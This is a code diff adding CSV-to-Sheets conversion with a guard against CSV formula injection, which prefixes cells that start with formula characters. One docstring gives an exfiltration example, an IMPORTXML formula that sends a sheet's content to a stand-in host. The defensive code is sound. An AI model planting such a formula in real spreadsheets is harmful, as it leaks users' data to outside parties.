@@ -13,6 +13,14 @@ from oto.tools.common.credentials import require
 SCOPES = ['https://www.googleapis.com/auth/spreadsheets']
 
 
+#: A cell sent as a JSON number: an optional minus, digits, an optional decimal part.
+#: Nothing else (no exponent, no thousands separator, no comma decimal), and no
+#: leading zero on a multi-digit integer part: `06400` stays text.
+_NOMBRE = re.compile(r'-?(0|[1-9]\d*)(\.\d+)?')
+#: First characters a spreadsheet reads as the start of a formula (OWASP, "CSV
+#: injection").
+_FORMULE = ('=', '+', '-', '@', '\t', '\r')
+
 #: A bare A1 range (`A:R`, `B5:D`, `5:9`), as opposed to a bare sheet name.
 _A1 = re.compile(r'[A-Za-z]{0,3}\d*(:[A-Za-z]{0,3}\d*)?')
 
@@ -167,6 +175,42 @@ class SheetsClient:
         writer = csv.writer(output)
         writer.writerows(rows)
         return output.getvalue()
+
+
+def values_from_csv(text: str, formulas: bool = False) -> List[List[Any]]:
+    """The rows of a CSV text, typed for a `USER_ENTERED` write.
+
+    RFC 4180: comma, double quotes, line breaks inside quoted fields; a leading
+    UTF-8 BOM is dropped. Each cell:
+
+    - a strict number (`-150.5`, `42`) goes as a JSON number — sent as text, a
+      sheet in a comma-decimal locale would read `-150.5` as something else;
+    - a cell starting with `'` stays text as is: the apostrophe is what keeps
+      `USER_ENTERED` from reading it (a 16-digit id it would cut to 15 digits);
+    - a cell `USER_ENTERED` would open as a FORMULA (`=`, `+`, `-`, `@`, tab, carriage
+      return) goes prefixed with `'`, unless `formulas=True`: a connector's CSV
+      carries text typed by third parties, and `=IMPORTXML("https://x/?"&A1)`
+      would send the sheet's content away;
+    - anything else stays text, so `USER_ENTERED` still reads dates and the like.
+
+    Rows are returned as they come, uneven lengths included: the sheet takes them
+    as written; a blank line is no row. A CSV with no rows gives `[]`.
+    """
+    if text.startswith('\ufeff'):
+        text = text[1:]
+    rows = csv.reader(io.StringIO(text, newline=''))
+    return [[_cellule(c, formulas) for c in row] for row in rows if row]
+
+
+def neutralize_formula(text: str) -> str:
+    """A text cell prefixed with `'` if a spreadsheet would open it as a formula."""
+    return "'" + text if text.startswith(_FORMULE) else text
+
+
+def _cellule(cell: str, formulas: bool) -> Any:
+    if _NOMBRE.fullmatch(cell):
+        return float(cell) if '.' in cell else int(cell)
+    return cell if formulas else neutralize_formula(cell)
 
 
 def _split_range(range: str) -> tuple:
